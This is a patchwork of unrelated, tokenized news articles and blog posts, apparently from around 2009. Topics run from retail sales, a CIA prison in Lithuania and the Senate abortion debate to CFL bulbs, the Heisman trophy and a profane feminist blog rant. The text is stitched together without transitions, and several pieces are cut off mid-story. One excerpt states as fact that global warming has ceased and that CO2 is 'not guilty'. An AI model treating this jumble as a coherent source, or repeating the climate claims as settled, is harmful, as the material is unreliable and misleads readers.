The instincts that governed the Egyptians and the Assyrians of old , govern us as well ; and as the ancients thought , grasped , struggled , and deceived , so shall we moderns continue to think , grasp , struggle , and deceive in our inmost hearts .
Change is only superficial and apparent .
Man ’s respect for the imponderables varies according to his mental constitution and environment .
Through certain modes of thought and training it can be elevated tremendously , yet there is always a limit .
The man or nation of high culture may acknowledge to great lengths the restraints imposed by conventions and honour , but beyond a certain point primitive will or desire cannot be curbed .
Denied anything ardently desired , the individual or state will argue and parley just so long — then , if the impelling motive be sufficiently great , will cast aside every rule and break down every acquired inhibition , plunging viciously after the object wished ; all the more fantastically savage because of previous repression .
The sole ultimate factor in human decisions is physical force .
This we must learn , however repugnant the idea may seem , if we are to protect ourselves and our institutions .
Reliance on anything else is fallacious and ruinous .
Dangerous beyond description are the voices sometimes heard today , decrying the continuance of armament after the close of the present hostilities .
The specific application of the scientific truth regarding man ’s native instincts will be found in the adoption of a post - bellum international programme .
Obviously , we must take into account the primordial sub - structure and arrange for the upholding of culture by methods which will stand the acid test of stress and conflicting ambitions .
In disillusioned diplomacy , ample armament , and universal training alone will be found the solution of the world ’s difficulties .
It will not be a perfect solution , because humanity is not perfect .
It will not abolish war , because war is the expression of a natural human tendency .
But it will at least produce an approximate stability of social and political conditions , and prevent the menace of the entire world by the greed of any one of its constituent parts .
To those who look beneath the surface , the present universal war drives home more than one anthropological truth in striking fashion ; and of these verities none is more profound than that relating to the essential immutability of mankind and its instincts .

NEW YORK ( CNNMoney.com ) --
Retailers placed a lot of hope on the Thanksgiving weekend gift buying this year , but merchants failed to get the big sales boost they were seeking .
According to monthly same - store tracker Thomson Reuters , overall sales rose just 0.5 % last month versus its forecast for a 2.1 % increase .
The figure does not include leading retailer Wal - Mart Stores ( WMT , Fortune 500 ) , which reports sales on a quarterly basis .
The firm tracks same - store sales , or sales at stores open at least a year , for such large national chains as J.C. Penney ( JCP , Fortune 500 ) , Macy's , Target ( TGT , Fortune 500 ) and Gap ( GPS , Fortune 500 ) .
Still , the marginal increase is an improvement over last year 's steep 7.8 % decline in November .
" The fundamentals for many Americans are still weak , " said Scott Hoyt , senior director of consumer economics with Moody 's Economy.com .
" Unemployment is more than 10 % , wages are not growing , the effects of the stimulus measure designed to boost spending have worn out and no more are coming , " he said .
Among these factors , the biggest overhang on consumer spending is the job market , Hoyt said .
" Consumer spending will turn when the job market improves , " he said .
Some specialty sellers were hit especially hard .
Among them same - store sales at teen clothing chain Hot Topic fell 11.7 % .
last month .
Analysts had expected a decline of 8.1 % , according to sales tracker Thomson Reuters .
Children 's Place , a seller of clothing and accessories for young kids , suffered a 13 % drop in its same - store sales versus expectations for a 1 % increase .
Sales at another youth merchandise chain Abercrombie & Fitch ( ANF ) slumped 17 %
Elsewhere , total sales at No. 1 warehouse club operator Costco ( COST , Fortune 500 ) rose 6 % compared to a forecast for an increase of 8.1 % .
Target , the No. 2 discounter after Wal - Mart , said its sales declined 1.5 % .
" Sales were slightly below our expectations as softer results in the first three weeks of the month were substantially offset by better - than - expected sales during our post - Thanksgiving Two - Day sale , " Gregg Steinhafel , CEO of Target Corporation , said in a statement .
" For the month overall , comparable store transactions were positive and inventories remain well - controlled , giving us confidence in our ability to perform well during the holiday season in what continues to be a challenging economic environment , " he said .
Sales at department store chain J.C. Penney declined 5.9 % , which the company said was in line with its expectations of a decline between 4 % to 7 % while sales at Macy 's fell 6.1 % .
But there were a few bright spots .
Limited Brands , parent of Victoria 's Secret and Bath & Body Works chains , increased its same - store sales by 3 % in November and high - end seller Nordstrom logged a 2.2 % gain in its sales last month .
November is a critical month for retailers since it marks the start of the year - end holiday shopping season , typically on Black Friday , the day after Thanksgiving .
November and December together can account for 50 % or more of merchants ' annual sales and profits for the full year .
Although many Americans have had a year to absorb shocks to the economy and to their own household budgets , industry watchers say continued job losses and stagnant income growth are forcing most consumers to keep shopping with extreme caution .
Given that context , the National Retail Federation ( NRF ) expects holiday sales to decline 1 % this year , a improvement from last year 's 3.4 % drop in sales for the season .
An EU document stressing that East Jerusalem should be the capital of a future Palestinian state brought a sharp response today from Israel , which claimed Brussels was damaging the prospects of peace talks restarting .
The draft document , to be discussed by EU foreign ministers next week , strongly criticised Israeli policies towards the Palestinians and warned negotiations need to resume urgently to break the " stalemate " in the peace process .
Although the EU has long said that Jerusalem 's future should be resolved in final status negotiations , the draft appears to be part of a diplomatic effort to strengthen the Palestinians and encourage them to return to talks .
The draft says a future Palestine should be made up of the West Bank and Gaza with East Jerusalem as its capital .
It adds that the EU did not recognise Israel 's annexation of East Jerusalem – a position shared by the rest of the international community .
" If there is to be a genuine peace , a way must be found to resolve the status of Jerusalem as the capital of two states , " says the draft , which the Israeli newspaper Ha'aretz has obtained a copy of .
Sweden , which currently holds the EU presidency , was singled out for blame by Israel .
" The move led by Sweden damages the ability of the European Union to take a role and be a significant factor in negotiations between Israel and the Palestinians , " the Israeli foreign ministry said .
" After the important steps taken by the government of Israel to enable the resumption of negotiations with the Palestinians , the European Union must now exert pressure on the Palestinians to return to the negotiating table .
Steps like those being led by Sweden only contribute to the opposite effect . "
Mahmoud Abbas , the Palestinian president , has refused to resume negotiations – now frozen for a year – unless Israel halts all construction in settlements , in line with its US roadmap obligations .
Israel has refused , offering instead a 10 - month partial freeze but insisting it will continue to build inside East Jerusalem settlements and on 3,000 homes and all public buildings in West Bank settlements .
Abbas has threatened not to run in the next presidential election , apparently out of frustration with a lack of progress and of US support .
Diplomats , and most senior Palestinian leaders , want him to stay .
The document – which comes ahead of a meeting on Tuesday of the EU foreign affairs council – insists that the borders of a future Palestinian state must be based on those in 1967 , which stood until the six day war , and should only be changed under joint agreement .
The draft also talks about recognising Palestinian statehood .
This comes at a time when Palestinian leaders have considered a unilateral declaration of independence or attempting to win a UN security council resolution affirming statehood over the West Bank , East Jerusalem and Gaza .
But the wording was careful not to say when such recognition would come .
" The council [ of the EU ] also reiterates its commitment to support further efforts and steps towards Palestinian statehood and to be able , at the appropriate time , to recognise a Palestinian state . "
It said settlements , Israel 's separation barrier and the demolition of Palestinian houses were " illegal under international law , constitute an obstacle to peace and threaten to make a two - state solution impossible . "
Israel 's long - running economic blockade of Gaza was " unacceptable " under international law and " politically counterproductive . "
But there was limited praise for Israel .
In the draft the EU says it hopes the 10 - month partial settlement freeze " will become a step towards resuming meaningful negotiations " and welcomed Israel 's removal of some of its hundreds of checkpoints and obstacles in the West Bank .
Today more Jewish settlers moved into a Palestinian house in Sheikh Jarrah in East Jerusalem , an area that has become a front line in Israel 's settlement project .
Several Palestinian houses in the east of the city have been demolished in recent weeks .
A UN spokesman described these as " provocative actions " and said they should " cease immediately " .
No really , Kimberly Broffman , get off of their lawns .
Kimberly , a 6 - year - old in the custody of her grandparents , is facing eviction by local law enforcement because her grandparents live in a retirement community .
The child has lived in the house her whole life , as her mother is unable to care for her due to unspecified drug problems .
Now authorities plan to remove the girl from the only home she ’s ever known and place her in foster care with strangers due to a homeowners association policy .
Kimberly ’s grandparents , Jimmy and Judie Stottler , have been unable to sell their home and move elsewhere due to the housing market crash .
The Stottlers have even lowered the price from $ 225,000 to $ 129,000 , willing to get completely hosed on the move just to keep their family intact , but no one is buying .
The battle has been going on for several years , the better portion of Kimberly ’s life , but the Stottlers are of limited resources to fight the situation .
Check out the MSNBC video below , where neighbors of the Stottman ’s advocate for tearing the family apart .
One woman , who looks like she ’s about to start talking boot - straps , cruelly states that Kimberly should be ejected from her home .
And the president of the homeowners association looks positively gleeful as he discusses the prospect of getting sheriffs to forcibly remove the small girl .
He says in response to a question about who will take Kimberly :
“ No , the sheriff will .
I will merely be the President of the Board who is trying to enforce the policies of our association that she agreed to when she moved in . ”

Over the past several months I 've pondered on many occasions the thought of switching financial institutions .
Bank Of America is my current home and although I 've never had any major problems with them they certainly have n't done society much good lately .
And so that nauseating feeling of supporting big greed and over compensated executives eats at me .
So as big of a pain in the ass as it can be I think I 'll be biting the bullet and moving on to support a local credit union or bank that is more in line with the community 's best interest .

After ABC News Report of Secret CIA Prison , Head Spy Resigns
The chief of Lithuanian intelligence steps down over a " black site " inquiry .
Dec. 15 , 2009  --
The head of Lithuanian intelligence resigned Monday in the wake of ABC News ' exclusive report that the CIA operated a secret prison for al - Qaeda detainees in 2004 and 2005 .
Povilas Malakauskas , head of Lithuania 's State Security department , left without prior public notice after two years in the position .
Lithuanian media quoted Arydas Anusauskas , head of a parliamentary committee investigating the prison , as saying that the intelligence chief stepped down " in part " because of the government 's effort to investigate the details surrounding the CIA facility .
Anusauskas told LNK TV that much of the government 's investigation could have been avoided if the intel chief had told the truth about his department 's involvement in the CIA program .
Anusauskas told ABC News that the resignation was first discussed in September , when Malakauskas refused to provide information to investigators .
On Nov. 18 , ABC News revealed the location of the secret prison , where harsh interrogation techniques were allegedly used on accused al - Qaeda terrorists , in a converted horseback riding facility 20 kilometers northeast of the Lithuanian capital of Vilnius .
Where affluent Lithuanians once rode show horses and sipped coffee at an attached café , the CIA installed a hidden concrete structure where it could hold up to eight " high value detainees " at a time , a current Lithuanian government official and a former CIA official told ABC News .
For many of the residents of this former Soviet state , it is reminiscent of the KGB 's secret prisons .
" As a Lithuanian , " a local woman told ABC News , " I am not very proud of this . "
" The activities in that prison were illegal , " said John Sifton , a New York attorney whose firm One World Research investigates human rights abuses .
" They included various forms of torture , including sleep deprivation , forced standing , painful stress positions . "
After ABC
News revealed the location of the prison , a top Lithuanian official said that the report was damaging to his country 's reputation .
" Obviously , this is not helping Lithuania 's image , " Foreign Minister Vygaudas Usackas told the Baltic News Service .
" Therefore it is vital that we conduct an investigation and clear any doubts . "
Usackas also warned Lithuanians not to believe " rumors or wild tales . "
Within weeks , however , the Lithuanian government investigation had confirmed that the CIA operated a secret black site prison in the country .
According to Lithuania 's LNK TV , sources told investigators that State Security was involved in coordinating the construction of the prison , and also provided the code name of the operation to transport terror detainees to the prison .
A " Building Within A Building "
It is not known which suspected al - Qaeda figures were in Lithuania , but 9/11 mastermind Khalid Sheikh Muhammad was moved out of the CIA 's secret prison in Poland just before the Lithuanian facility was opened .
According to sources who say they saw the facility , the riding academy originally consisted of an indoor riding area with a red metallic roof , a stable and a cafe .
The CIA built a thick concrete wall inside the riding area .
Behind the wall , it built what one Lithuanian source called a " building within a building . "
On a series of thick concrete pads , it installed what a source called " prefabricated pods " to house prisoners , each separated from the other by five or six feet .
Each pod included a shower , a bed and a toilet .
Separate cells were constructed for interrogations .
The CIA converted much of the rest of the building into garage space .
Intelligence officers working at the prison were housed next door in the converted stable .
A woman who lives near the complex , and who refused to give her name for fear of retribution reports that when she often saw cars with black - tinted windows drive up to the buildings .
When a garage door opened , all the lights in the complex would go off until the car had entered the building and the door had closed .
Electrical power for both structures was provided by a 2003 Caterpillar autonomous generator .
All the electrical outlets in the renovated structure were 110 volts , meaning they were designed for American appliances .
European outlets and appliances typically use 220 volts .
Locals report that English - speaking guards worked at the complex , and often swam in a nearby lake .
The guards were rotated every 90 days .
Lithuanian officials provided ABC News with the documents of what they called a CIA front company , Elite , LLC , which purchased the property and built the " black site " in 2004 .
ABC
News first reported that Lithuania was one of three eastern European countries , along with Poland and Romania , where the CIA secretly interrogated suspected high - value al - Qaeda terrorists .
The CIA purchased the riding academy property in March 2004 , the same month Lithuania marked its formal admission to NATO .
Poland joined NATO in 1999 , and Romania joined in 2004 .
The CIA opened the prison in Sept. 2004 , and closed it in Nov. 2005 , former CIA officials told ABC News .
The CIA declined to talk about the prison .
" The CIA 's terrorist interrogation program is over , " said CIA spokesman Paul Gimigliano .
" This agency does not discuss publicly where detention facilities may or may not have been . "

There ’s Biscuits Enough For All
The “ Good ” Women
Yawn .
Another so - called feminist group has cropped up , just to , you guessed it , elevate themselves above other women .
Yes , yes , to soothe the antagonistic nerves of men who presented to them a theoretical post about a non-existing reality ( male fetuses and babies being murdered ) compared to , you know , a reality ( females fetuses and babies being murdered ) , the good and kind cookie - snatchers assured the menz that none of that hyperbolic - out - of - the box thinking will be allowed on their watch .
Obviously , it is more important to them to spare a man ’s feelings than it is to support a female centered blog , even if that support requires nothing more than not using us as an example of something out of their scope .
Because , men can never be allowed to feel as if there are women who do n’t care about male welfare over the welfare of females .
Please someone , anyone toss them the biscuits / cookies they so desperately need .
We oppose men ’s groups on our campuses !
can go fuck themselves .
They are nothing more than a pseudo - equality - feminist - reaction ( with pseudo male supporters who just want to get in the pants of “ feminists ” so he can brag that he had sex with a “ feminist ” and / or homosexual men who will get more points from society for being a feminist than a woman will ) that will cave the second one of those “ good ” men un - join their little man ’s club and present them with a blood diamond in exchange for a life time of servitude .
( I know , I know , yours will be different .
The wheel will be reinvented for real circular motion ) .
Here ’s a clue , if what you allow on your site ( the demonization of our blog , –a female - centered place ) cannot or is not intended to subvert the patriarchy , then you are acting in accordance with the patriarchy .
Men have power in society ; therefore , if they are opposing a female stance , when you let that male speak on your blog or degrade other feminists , you are reinforcing his power .
There is no equality in making way for oppressors to flaunt their privilege .
It gets old , honestly .
Remember last year ?
When the news broke that Oklahoma Quarterback Sam Bradford captured the Heisman trophy , many did n’t agree with picking a sophomore who comes from the same system that produced Josh Heupel and Jason White .
Particularly with fellow quarterbacks Colt McCoy and Tim Tebow having great years .
Bradford may have won the trophy , but Tebow supporters took solace in the fact Florida ran over Oklahoma to capture the national title only a few weeks later .
Well all three quarterbacks returned in 2009 .
And guess what ?
None of them won .
Instead it was Alabama runner Mark Ingram who took home the Heisman Trophy .
A first for the historic Crimson Tide program .
It was not without controversy , however , as it was the closest vote in the award ’s 75 - year history .
Ingram finished a mere 28 points ahead of Stanford running back Toby Gerhart , a rare breed of player in that he ’s a white running back .
For all the hype , Tebow finished fifth and Bradford was never in contention .
Archie Griffin can breathe a Mercury Morris - style sigh of relief as he remain college football ’s only two - time Heisman trophy winner .
At least for another year .
Ingram ’s a sophomore and will be back again next year .
So too could Bradford , although early indications are that he plans to enter the 2010 NFL Draft .
How Bradford and other Heisman hopefuls fare in the NFL is a whole nother question .
In the last decade or so , the award has morphed from the best college football player award into an award simply given to a QB on a top ranked team .
The fact Ingram broke that streak is somewhat refreshing .
But it ’s probably just a hiccup in a quarterback dominated award .
The real question is , what does the award mean for NFL success ?
The answer is unclear .
Football is the ultimate team game , and it is often difficult to separate an individual ’s success from that which can be attributed to being on a superior team , surrounded by better talent , or the simply in a system suited to one ’s skills .
After all , Tim Tebow comes from the same system that tricked NFL executives into making Alex Smith the # 1 overall draft pick .
Granted , being an outstanding NFL player is not a requisite of a outstanding college player .
It ’s possible to simply be better suited for the college game .
But NFL failure is often a clue that a player was overrated in college , either through a superior supporting cast or a better system that dominated weaker opponents .
To show how meaningless the Heisman can be , we look back at the last twenty years of winners , how they fared in the NFL , where they are now , and notables who came close to winning in their respective years .

After a year of anticipation , he was shockingly passed over with the first overall pick .
The Houston Texans instead favored DE Mario Williams .

Bush has not been a successful runner at the pro level , but remains an excellent receiver and electric punt returner .

He ’s been a member of two national championship teams , and will finally head to the NFL after the end of the collegiate season .

2008 – QB Sam Bradford , Oklahoma
Draft Position : N / A
NFL Career : N / A
Where are they now ? :
As a redshirt sophomore , Bradford opted to not declare for the NFL Draft in 2009 and instead returned to Oklahoma for his junior year .
It did not go well , as Bradford suffered through an injury plagued season .
In fact , his entire post - Heisman career has n’t gone too well , as he promtly lost the BCS Championship to Florida in a clash with 2007 Heisman winner Tim Tebow before his disappointing 2009 season .

This photo shows a colony of human embryonic stem cells growing on mouse feeder cells .
This cell line ( CHB - 1 ) was established at Children 's Hospital Boston .
Health officials Wednesday gave the green light to federally funded research on 13 human embryonic stem cell lines , the first approved since the Bush administration imposed limits eight years ago .
" What we are announcing today is just the beginning , " Francis Collins , National Institutes of Health director , said Wednesday .
Approval was " open and shut , " he said , because the lines met requirements of new Obama administration guidelines for informed consent of embryo donors .
An embryonic stem cell line is a colony of cells grown from one embryo , which is destroyed in the process .
The cells can grow into every type of body tissue .
Collins and others propose using the cells to study embryonic development , screen drugs and perhaps grow rejection - free replacement organs .
" It 's very exciting , " says George Daley of Children 's Hospital Boston , whose lab submitted 11 of the 13 approved lines .
The other two lines belong to Ali Brivanlou at Rockefeller University in New York .
The NIH will allow researchers , whose 31 grants for using such cells had awaited the announcement , to now proceed with the 13 lines .
" Eventually , the new guidelines will open up several hundred lines , " says Dartmouth bioethicist Ronald Green .
" Researchers need to be patient . "
In July , the NIH answered President Obama 's call for new federal funding rules for human embryonic stem cell research , overturning Aug. 9 , 2001 , Bush administration rules that limited funding to 21 lines created before that date .
Richard Doerflinger of the U.S. Conference of Catholic Bishops , which opposes embryonic cell research , called the announcement " a political event , but the science is all moving in the other direction , " toward " induced " stem cells , which are grown from skin cells but with the tissue - growing potential of embryonic cells .
But Collins said the embryonic stem cells possess unique potential and also will illuminate induced cell line research .

The Senate took a crucial step toward a showdown on abortion with the introduction of an amendment by Sen. Ben Nelson ( D - Neb. ) and nine other anti-abortion - rights senators .

“ As written , the Senate healthcare bill allows taxpayer dollars , directly and indirectly , to pay for insurance plans that cover abortion .
Most Nebraskans , and Americans , do not favor using public funds to cover abortion and as a result this bill should n’t open the door to do so , ” Nelson said in a statement .
Nelson has made plain that he is prepared to join a Republican filibuster of the bill if strict abortion language is not adopted .
The Senate will consider the amendment in the coming days but Nelson and his anti-abortion - rights allies in the Senate likely cannot muster the 60 votes they need to prevail .
Because Reid needs to hold his entire 60 - member Democratic caucus together on the healthcare bill in order to advance it toward passage , a defection by Nelson over abortion would force Reid to seek at least one GOP supporter .

Casey , Nelson and other lawmakers worked closely with the U.S. Conference of Catholic Bishops to come up with language that would meet the church 's requirements .
In a letter sent to all 100 senators Monday , the bishops endorse the Nelson amendment .
The Nelson amendment is based on language authored by Rep. Bart Stupak ( D - Mich . ) and attached to the House - passed healthcare reform bill .
Though the Stupak amendment passed the House floor and pro-abortion - rights Democrats in the lower chamber did not revolt and oppose the legislation itself , interest groups and abortion - rights supporters in the House and Senate have vowed to fight a healthcare bill that includes the Stupak amendment or similar provisions .
President Barack Obama Barack Hussein ObamaIt 's now up to health systems to solve our food problems Testing the Electoral College process against judicial overreach Obama steps into The Shade Room to urge ' roommates ' to vote , says White House ' working to keep people from voting ' MORE also indicated after the House vote that the Stupak amendment goes too far .
The authors of the Senate healthcare reform legislation maintain , as the did the authors of the underlying House bill , that their measure already upholds a law named after former Rep. Henry Hyde ( R - Ill . ) that prohibits federal funding of abortions by requiring abortion services be paid for using only money from insurance customers ’ premiums , not from any federal funding or federal subsidies .
But anti-abortion - rights lawmakers and activists , including the Catholic Church , reject this approach as an accounting gimmick .
Two of the Republican co-sponsors expressed doubt the amendment would pass the Senate even if all anti-abortion - rights Republicans vote for it .
" A lot of us on the Republican side will support that .
The question is whether or not you can get 60 , which I think is very much in doubt , " said Thune , the chairman of the Republican Policy Committee .
" I certainly hope that it passes .
I ’m enough of a realist , talking to both Democrats and Republicans , to believe that that ’s going to be a very heavy lift . "
Even if the amendment goes down as expected , Coburn predicted Reid would be forced to include provisions similar to the Stupak amendment in the final bill via a manager 's amendment containing numerous changes agreed to by the Democratic caucus if he hopes to win 60 votes .
Reid is holding a vote on the Nelson amendment to provide Democrats on both sides of the abortion issue with political cover so they can say they fought for their principles , Coburn said .
" They ’re going to allow a cover vote , " Coburn said , " so everybody can stake their position [ and ] say , ‘ Well , I ca n’t control the manager ’s amendment . ’ "
One of the arguments used by the Government to justify the war in Iraq was that WMDs could fall into the hands of terrorists , but Mr Dowse said that , while Saddam Hussein had supported Palestinian terrorist groups , the assessment was that the Iraqi regime 's contacts with groups linked to al Qaeda were " quite sporadic " .
A computer issue has been blamed for bringing Brisbane 's train systems to a halt Tuesday evening , a Translink spokesman has confirmed .
Public transport body Translink revealed that a Queensland Rail network - wide computer issue left passengers stranded on commuter trains for a period of 24 minutes Tuesday night .
The computer issue caused signalling problems throughout the network and followed " similar incidents " last month , the spokesman said .
" To ensure the safety of passengers and staff on the network , trains were halted between 6:21 pm and 6:45 pm while the fault was rectified . "
The spokesman said that " independent reviews " of the central computer system by " experts from the software / hardware suppliers " was being commissioned .
IBM was conducting a review of the IT system hardware whilst Siemens would start a " further investigation into the software functionality " on Monday .
Translink was unable to clarify if the glitch was caused by a security breach .
" Until the reviews are concluded , we are unable to speculate what caused the problems , " the spokesman said .

The answer may lie with blood flow US scientists are testing a radical new theory that multiple sclerosis ( MS ) is caused by blockages in the veins that drain the brain .
The University of Buffalo team were intrigued by the work of Italian researcher Dr Paolo Zamboni who claims 90 % of MS is caused by narrowed veins .
He says the restricted drainage , visible on scans , injures the brain leading to MS .
He has already widened the blockages in a handful of patients .
The US team want to replicate his earlier work before treating patients .
Experts welcomed the research saying it was important to confirm the basic science before evaluating any therapy .
MS is a long - term inflammatory condition of the central nervous system which affects the transfer of messages from the nervous system to the rest of the body .
This is not something patients can expect as a treatment now .
This is experimental work and is being tested
A spokeswoman for the MS Society The Buffalo team , led by Dr Robert Zivadinov , plan to recruit 1,100 patients with MS and 600 other volunteers as controls who are either healthy or have neurological diseases other than MS .
Using Doppler ultrasound , they will scan the patients to see if they can find any blockages within the veins of the neck and brain .
If they can prove Dr Zamboni 's theory of " chronic cerebrospinal venous insufficiency " , they say it will change our understanding of MS .
Rewriting science Margaret Paroski , who is chief medical officer at Kaleida Health , where the Buffalo researchers are based , said the work could overturn prevailing wisdom that the damage in MS is predominantly the result of abnormal immune responses .
" When I was in medical school , we thought peptic ulcer disease was due to stress .
We now know that 80 % of cases are due to a bacterial infection .
I found the evidence of narrowing - narrowing of the veins just in MS patients
Dr Zamboni " Dr Zivadinov 's work may lead to a whole different way of thinking about MS . "
Dr Zamboni , of the University of Ferrara , believes the blockages are the cause rather than the consequence of MS and that they allow iron from the blood to leak into the brain tissue , where it causes damage .
He has performed procedures similar to angioplasty to unblock the veins and get the blood flowing normally again .
He claims this " liberation procedure " can alleviate many of the symptoms of MS and is due to publish his findings in the Journal of Vascular Surgery .
In an interview with CTV News in Canada he said : " I found the evidence of narrowing - narrowing of the veins just in MS patients .
" I 'm fully convinced that this is very , very important for people . "
Early days Kevin Lipp , an MS patient from the US , has been symptom - free since being treated by Dr Zamboni .
He said : " It 's only been 10 months .
If nothing happens in the next two to three years , we 'll know it 's working . "
The BBC has heard anecdotally of other surgeons in Europe testing out the same treatment .
The MS Society said more research was needed to see if this was an avenue that should be explored further .
" This is not something patients can expect as a treatment now .
This is experimental work and is being tested .
We need to know more about its safety and effectiveness . "
Helen Yates , of the MS Resource Centre , said : " There is no doubt that this area warrants a great deal more study .
" This could represent a completely novel approach to MS research which , if proven to be relevant , could be a " sea change " in the understanding of the mechanisms involved in the condition . "

Why eco -light bulbs are n't what they seem
By Ruth Alexander
BBC 's More or Less
Save the planet , switch to eco - light bulbs .
So goes the refrain .
But are these as bright , long - lasting and energy efficient as is often claimed ?
The traditional incandescent bulb is on the way out .
European law means people will be encouraged to use longer - lasting , energy - efficient lights instead .
Old - style bulbs are an eco-enemy
But many remain unconvinced that the common alternative - compact fluorescent lamps ( CFLs ) - are up to the job .
European legislation has already banned the manufacture and import of 100 - watt incandescent bulbs .
In 2011 , 60 - watt bulbs will go , and 40 - and 25 - watt bulbs will be banned by 2012 .
But are these bulbs quite as good as is claimed ?
BRIGHTNESS
Think those compact fluorescent bulbs are not as bright as the old - style lights they replaced ?
You are probably not imagining it .
A guide to the amount of light given by a CFL bulb is given on its box as a comparison to the wattage of an incandescent bulb .
But the European Commission says in a FAQ document this can be misleading .
" Currently , exaggerated claims are often made on the packaging about the light output of compact fluorescent lamps - for example that an 11 - 12 - watt compact fluorescent lamp would be the equivalent of a 60 - watt incandescent , which is not true . "
What wattage will be as bright ?
The Lighting Industry Federation says the claims on the packaging are the nearest equivalent to the wattage of a soft white light bulb .
Liz Peck , of the Society of Light and Lighting , says this is because CFLs have a phosphor coating .
" They compare like for like , but the trouble is people tend to use the clear bulbs at home and it's not equivalent to those . "
The European Commission 's advice is to divide the wattage of a traditional light bulb by four to get the equivalent brightness .
So , to get the brightness of a traditional 60 - watt bulb , choose a 15 - watt CFL bulb .
FIND OUT MORE More or Less is on BBC Radio 4 on Friday 11 December at 1330 GMT , and repeated Sunday 2000 GMT
Or catch up on the iPlayer
Copenhagen Summit 2009
But the Lighting Research Center in the United States goes further .
" We believe in the divide by three rule , " says associate director Russell Leslie , who recommends a 20 - watt CFL to match a 60 - watt incandescent bulb .
" The equivalent ratings you see on the box are usually got by testing in a laboratory environment . "
At home , brightness varies as conditions change .
" A compact fluorescent light is designed to provide maximum light output at 25C , and when it gets hotter or colder than that , its brightness can be reduced .
" If your bulb is in a recessed fixture in the ceiling , and it gets warm , you might see a 10 - 20 % reduction in its light output . "
And studies show CFL bulbs can get 20 % dimmer over time .
New European regulations expected next year mean manufacturers will have to display lumens - a measure of light output - more prominently than wattage on bulb packaging .
LIFESPAN
Another complaint is eco bulbs - supposed to last for years - frequently conk out early .
" Unfortunately you get what you pay for , " says Ms Peck .
While a branded bulb from a well - known manufacturer may indeed last the promised 10 years , one from a supermarket budget line may not .
Wo n't need to change this for 10 years ?
Perhaps not
But even branded bulbs do n't always last as long as expected - this is because the lifespan given is an average .
When a batch of bulbs is tested , they are turned on for three hours , then off for 20 minutes over and over again until half the batch fails .
This point in time is then decreed the average life .
It is often 10,000 hours .
As no - one adds up the hours a light is on over its lifespan , this is translated as 10 years , on the assumption that the bulb will be on for an average of three hours a day .
But as half the bulbs will fail before 10,000 hours , a shopper may be unlucky enough to pick a dud that will fail after just 2,000 hours .
However , the main manufacturers do their best to make bulbs that cluster around the average life mark , says the Lighting Industry Federation .
And what you do with a bulb can affect its lifespan , says Mr Leslie .
Continuously turning it off and on every 15 minutes , for example , will more than halve its expected lifespan .
ENERGY EFFICIENCY
Just how energy efficient are these lights ?
The European Commission , the Energy Saving Trust and manufacturers say CFLs use up to 80 % less electricity than traditional bulbs .
How is this number calculated ?
It 's worked out by comparing the best compact fluorescent lamp 's wattage with the wattage of an equivalent incandescent bulb , says a spokeswoman for the European Commission .
Do the energy saving claims stack up ?
But that results in a 5:1 energy ratio between the two - a claim it says is an exaggeration when manufacturers use it .
And it's the " up to " in this 80 % claim that is important .
The EC spokeswoman says the saving can be as low as 60 % .
John Henderson , an energy - use expert from the consultancy Building Research Establishment , says although CFLs are better than traditional bulbs , policy - makers should not draw simple conclusions from simple sums about their energy saving potential .
" When you see an 80 % savings figure on the side of a low - energy light bulb , it does n't actually mean that you 're going to save 80 % lighting energy , 80 % carbon emissions , and 80 % costs . "
Traditional bulbs expend about 95 % of their energy producing heat .
The European Commission considers this to be heat loss .
But Mr Henderson disagrees .
" Let 's say your house uses 1,000 kWh a year to produce the light you use .
If you were to replace all the old - fashioned light bulbs with the modern low energy lamps , you might expect an 80 % reduction - 800kWh .
Do old - style bulbs help heat the house ?
" However you 'd find about 60 % of that 800kWh would get automatically chucked back in by your thermostat - controlled heating system .
A typical heating system is only about 75 % efficient .
So the actual figure you end up with is more like 240kWh a year , rather than the 800kWh you expected . "
That number is only a rough guide , as most homes have gas central heating which is cheaper and less carbon intensive than an electric heating system .
Meanwhile , the Institute of Lighting Engineers is considering changing its estimate of the energy savings represented by CFLs from 80 % to 70 % .
This is because the power factor of CFLs is low , which means a utility company needs to use more energy to get these lights to work , which can also cause disruptions in the power network .
The future 's bright ... or bright - ish Ms Peck , of the Society of Light and Lighting , says CFLs have improved in recent years - they flicker less , and warm up faster .
Nor should people worry that they contain mercury , as it is a very small amount .
There are other energy - saving options , she says , such as halogen tungsten lights which are about 30 % more efficient than incandescent bulbs .
And technology is developing fast , so it could be only a few years before people are lighting their homes with LED lights , which experts say have the potential to be more efficient than CFLs .

A supporter of Ukraine 's President Viktor Yushchenko shaves after spending the night outside the Central Election Committee building in central Kiev April 9 , 2007 .
REUTERS / Damir Sagolj
CHICAGO ( Reuters Life ! ) - Maybe American men should skip a day of shaving , especially when interviewing for a job .
Sporting a mustache may improve your chances of landing a higher paying job , according to a study commissioned by financial services provider Quicken and the American Mustache Institute which admittedly represents people opting for facial hair .
The study found that mustached Americans earned 8.2 percent more on average than those with beards and 4.3 percent more than the clean shaven .
But the news is not all good .
Mustached Americans also tended to spend 11 percent more and save 3 percent less than their collective counterparts , according to the study , titled “ Saving and Spending Patterns of Mustached Americans . ”
“ If efficiencies in financial management could be realized in the near - term .. it ’s highly probable that over the next four to five years , we will see mustached Americans ’ savings rate grow to surpass their bearded and shaven peers , ” research consultant Hans Menjou - Bartchen said in a statement .
The study was conducted during the first six months of 2009 , examining a random sample of 2,000 mustached American men along with 2,000 bearded and 2,000 clean - shaven peers .

Key Excerpts :
Observations of the Sun show that as for the increase in temperature , carbon dioxide is “ not guilty ” and as for what lies ahead in the upcoming decades , it is not catastrophic warming , but a global , and very prolonged , temperature drop .
[ …]
Over the past decade , global temperature on the Earth has not increased ; global warming has ceased , and already there are signs of the future deep temperature drop .
[ …]
It follows that warming had a natural origin , the contribution of CO2 to it was insignificant , anthropogenic increase in the concentration of carbon dioxide does not serve as an explanation for it , and in the foreseeable future CO2 will not be able to cause catastrophic warming .
The so - called greenhouse effect will not avert the onset of the next deep temperature drop , the 19th in the last 7500 years , which without fail follows after natural warming .
[ …]
We should fear a deep temperature drop — not catastrophic global warming .
Humanity must survive the serious economic , social , demographic and political consequences of a global temperature drop , which will directly affect the national interests of almost all countries and more than 80 % of the population of the Earth .
A deep temperature drop is a considerably greater threat to humanity than warming .
However , a reliable forecast of the time of the onset and of the depth of the global temperature drop will make it possible to adjust in advance the economic activity of humanity , to considerably weaken the crisis .

SAN FRANCISCO ( MarketWatch ) -- Shares of Fannie Mae and Freddie Mac surged Monday after the government announced unlimited taxpayer support for the mortgage giants .
